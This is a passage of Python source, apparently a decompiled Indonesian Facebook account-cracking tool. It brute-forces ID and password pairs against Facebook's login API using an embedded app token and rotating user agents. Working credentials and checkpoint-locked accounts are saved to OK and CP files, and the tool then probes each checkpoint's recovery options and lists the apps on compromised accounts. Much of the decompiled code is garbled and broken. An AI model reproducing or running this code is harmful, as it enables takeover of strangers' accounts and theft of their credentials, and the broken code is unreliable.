                ua = random.choice(ugen).replace('\n', '')
                (sys.stdout.write(f'''\r  🙂{P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{p}{cp}{x}]—[{m}{'{:.0%}'.format(loop / float(len(id)))}{P}]  '''),)
                sys.stdout.flush()
                ua = random.choice(ugen)
                ua2 = random.choice(ugen2)
                ses = requests.Session()
                for pw in pwv:
                    
                    try:
                        head = {
                            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                            'x-fb-sim-hni': str(random.randint(20000, 40000)),
                            'x-fb-net-hni': str(random.randint(20000, 40000)),
                            'x-fb-connection-quality': 'EXCELLENT',
                            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                            'user-agent': ua,
                            'content-type': 'application/x-www-form-urlencoded',
                            'x-fb-http-engine': 'Liger' }
                        resp = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(idf) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', head, **('headers',))
                        if 'www.facebook.com' in resp.json()['error_msg']:
                            if 'ya' in oprek:
                                akun.append(idf + '|' + pw)
                                ceker(idf, pw)
                            else:
                                print('\r%s    %s | %s        ' % (p, idf, pw))
                                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                                akun.append(idf + '|' + pw)
                                cp += 1
                        elif 'session_key' in resp.text and 'EAAA' in resp.text:
                            print('\r%s    %s | %s        ' % (h, idf, pw))
                            open('OK/' + okc, 'a').write(idf + '|' + pw + '\n')
                            ok += 1
                    finally:
                        pass
                    continue
                    if requests.exceptions.ConnectionError:
                        time.sleep(31)
                        continue

                    loop += 1
                    return None

            
            def ceker(idf, pw):
                global cp
                ua = 'Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)AppleTV6,2/11.1AppleTV5,3/9.1.1'
                head = {
                    'Host': 'mbasic.facebook.com',
                    'cache-control': 'max-age=0',
                    'upgrade-insecure-requests': '1',
                    'origin': 'https://mbasic.facebook.com',
                    'content-type': 'application/x-www-form-urlencoded',
                    'user-agent': ua,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'x-requested-with': 'mark.via.gp',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-user': '?1',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' }
                ses = requests.Session()
                
                try:
                    hi = ses.get('https://mbasic.facebook.com')
                    ho = sop(ses.post('https://mbasic.facebook.com/login.php', {
                        'email': idf,
                        'pass': pw,
                        'login': 'submit' }, head, True, **('data', 'headers', 'allow_redirects')).text, 'html.parser')
                    jo = ho.find('form')
                    data = { }
                    lion = [
                        'nh',
                        'jazoest',
                        'fb_dtsg',
                        'submit[Continue]',
                        'checkpoint_data']
                    for anj in jo('input'):
                        if anj.get('name') in lion:
                            data.update({
                                anj.get('name'): anj.get('value') })
                    kent = sop(ses.post('https://mbasic.facebook.com' + str(jo['action']), data, head, **('data', 'headers')).text, 'html.parser')
                    print('\r%sChang %s|%s ➤ CP       %s' % (b, idf, pw, x))
                    open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                    cp += 1
                    opsi = kent.find_all('option')
                    if len(opsi) == 0:
                        print('\r%s➤ Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)' % (hh, x))
                finally:
                    return None
                    for opsii in opsi:
                        print('\r%s➤ %s%s' % (kk, opsii.text, x))
                    return None
                    if Exception:
                        c = None
                        
                        try:
                            print('\r%sChang %s|%s ➤ CP       %s' % (b, idf, pw, x))
                            print('\r%s➤ Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s' % (u, x))
                            open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                            cp += 1
                        finally:
                            c = None
                            del c
                            return None
                            c = None
                            del c



            
            def cek_opsi():
                c = len(akun)
                hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu' % c
                cetak(nel(hu, 'CEK OPSI', **('title',)))
                input(x + '[' + h + '•' + x + '] Mulai')
                cek = '# PROSES CEK OPSI DIMULAI'
                sol().print(mark(cek, 'green', **('style',)))
                love = 0
                for kes in akun:
                    
                    try:
                        
                        try:
                            id = kes.split('|')[0]
                            pw = kes.split('|')[1]
                        finally:
                            pass
                        if IndexError:
                            time.sleep(2)
                            print('\r%sChangFB %s ➤ Error      %s' % (b, kes, x))
                            print('\r%s➤ Pemisah Tidak Didukung Untuk Program Ini%s' % (u, x))
                        continue
                        bi = random.choice([
                            u,
                            k,
                            kk,
                            b,
                            h,
                            hh])
                        sys.stdout.flush()
                        ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
                        ses = requests.Session()
                        header = {
                            'Host': 'mbasic.facebook.com',
                            'cache-control': 'max-age=0',
                            'upgrade-insecure-requests': '1',
                            'origin': 'https://mbasic.facebook.com',
                            'content-type': 'application/x-www-form-urlencoded',
                            'user-agent': ua,
                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                            'x-requested-with': 'mark.via.gp',
                            'sec-fetch-site': 'same-origin',
                            'sec-fetch-mode': 'navigate',
                            'sec-fetch-user': '?1',
                            'sec-fetch-dest': 'document',
                            'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',
                            'accept-encoding': 'gzip, deflate',
                            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' }
                        hi = ses.get('https://mbasic.facebook.com')
                        ho = sop(ses.post('https://mbasic.facebook.com/login.php', {
                            'email': id,
                            'pass': pw,
                            'login': 'submit' }, header, True, **('data', 'headers', 'allow_redirects')).text, 'html.parser')
                        if 'checkpoint' in ses.cookies.get_dict().keys():
                            
                            try:
                                jo = ho.find('form')
                                data = { }
                                lion = [
                                    'nh',
                                    'jazoest',
                                    'fb_dtsg',
                                    'submit[Continue]',
                                    'checkpoint_data']
                                for anj in jo('input'):
                                    if anj.get('name') in lion:
                                        data.update({
                                            anj.get('name'): anj.get('value') })
                                        continue
                                kent = sop(ses.post('https://mbasic.facebook.com' + str(jo['action']), data, header, **('data', 'headers')).text, 'html.parser')
                                print('\r%sChangFB %s|%s ➤ CP       %s' % (b, id, pw, x))
                                opsi = kent.find_all('option')
                                if len(opsi) == 0:
                                    print('\r%s➤  Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)' % (hh, x))
                                else:
                                    for opsii in opsi:
                                        print('\r%s➤ %s%s' % (kk, opsii.text, x))
                            print('\r%sChangFB %s|%s ➤ CP       %s' % (b, id, pw, x))
                            print('\r%s➤ Tidak Dapat Mengecek Opsi%s' % (u, x))
                            if 'c_user' in ses.cookies.get_dict().keys():
                                print('\r%sChangFB %s|%s ➤ OK       %s' % (h, id, pw, x))
                            else:
                                print('\r%sChangFB %s|%s ➤ SALAH       %s' % (x, id, pw, x))


                        love += 1
                    finally:
                        continue
                        if requests.exceptions.ConnectionError:
                            print('')
                            li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
                            sol().print(mark(li, 'red', **('style',)))
                            exit()
                            continue
                        dah = '# DONE'
                        sol().print(mark(dah, 'green', **('style',)))
                        exit()
                        return None


            
            def cek_apk(session, cookie):
                w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', {
                    'cookie': cookie }, **('cookies',)).text
                sop = BeautifulSoup(w, 'html.parser')
                x = sop.find('form', 'post', **('method',))
                game = (lambda .0: [ i.text for i in .0 ])(x.find_all('h3'))
                if len(game) == 0:
                    print(f'''\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.''')
                else:
                    for i in range(len(game)):
                        print('   %s%s. %s%s' % (H, i + 1, game[i].replace('Ditambahkan pada', ' Ditambahkan pada'), N))
                w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', {
                    'cookie': cookie }, **('cookies',)).text
                sop = BeautifulSoup(w, 'html.parser')
                x = sop.find('form', 'post', **('method',))
                game = (lambda .0: [ i.text for i in .0 ])(x.find_all('h3'))
                if len(game) == 0:
                    print(f'''\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.''')
                    return None
                for i in None(len(game)):
                    print('   %s%s. %s%s' % (K, i + 1, game[i].replace('Kedaluwarsa', ' Kedaluwarsa'), N))

            if __name__ == '__main__':
                
                try:
                    os.system('git pull')
                finally:
                    pass
                
                try:
                    os.mkdir('OK')
                finally:
                    pass
                
                try:
                    os.mkdir('CP')
                finally:
                    pass
                
                try:
                    os.mkdir('/sdcard/ChangFB-,DUMP')
                finally:
                    pass
                
                try:
                    os.system('touch .prox.txt')
                finally:
                    pass
                
                try:
                    os.system('')
                finally:
                    pass
                
                try:
                    os.system('clear')
                finally:
                    pass
                time.sleep(3)
                login()
                return None
                return None









